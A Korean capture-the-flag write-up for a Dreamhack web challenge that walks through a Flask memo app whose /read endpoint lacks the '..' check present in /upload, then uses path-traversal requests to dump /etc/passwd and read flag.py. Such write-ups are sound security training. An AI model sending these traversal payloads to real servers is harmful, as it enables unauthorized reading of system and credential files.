# file-download-1 WriteUp
File Download Vulnerability가 존재하는 웹 서비스이다 flag.py를 다운받으면 flag 획득 가능하다.

### /upload

```
@APP.route('/upload', methods=['GET', 'POST'])
def upload_memo():
    if request.method == 'POST':
        filename = request.form.get('filename')
        content = request.form.get('content').encode('utf-8')

        if filename.find('..') != -1:
            return render_template('upload_result.html', data='bad characters,,')

        with open(f'{UPLOAD_DIR}/{filename}', 'wb') as f:
            f.write(content)

        return redirect('/')

    return render_template('upload.html')
```
파일 업로드를 처리하는 코드이다. `..`가 포함되어있는지 검사하여 상위 디렉터리로 이동하는 것을 방지한다

### /read

```
@APP.route('/read')
def read_memo():
    error = False
    data = b''

    filename = request.args.get('name', '')

    try:
        with open(f'{UPLOAD_DIR}/{filename}', 'rb') as f:
            data = f.read()
    except (IsADirectoryError, FileNotFoundError):
        error = True


    return render_template('read.html',
                           filename=filename,
                           content=data.decode('utf-8'),
                           error=error)
```

사용자가 요청한 파일을 열어서 읽고 이를 웹 페이지에 표시한다. 웹 내용을 표시할 때, upload와 달리 상위 디렉터리에 대한 제한이 없는 것으로 확인되며 /read 엔드포인트에서 익스플로잇을 진행한다.

하지만 아까 코드에서 봤다싶이 /upload 에서는 디렉터리 순회나 상위 디렉터리에 들어갈 수 있는 방법이 없기 때문에 아무런 파일을 만들어 업로드 한다음
업로드한 파일에 접속해 디렉터리 순회를 이용하여 파일을 읽는다.
아래는 개념 증명용 이다.

```
/read?name=../../../../../etc/passwd

root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
dreamhack:x:1000:1000:Linux User,,,:/home/dreamhack:/bin/ash
```

Path Traversal 취약점도 이용가능하니  이번엔 ../flag.py 파일을 한번 읽어봐야겠다.


# flag 획득

```
/read?name=../flag.py

FLAG = 'DH{flag!!}'

```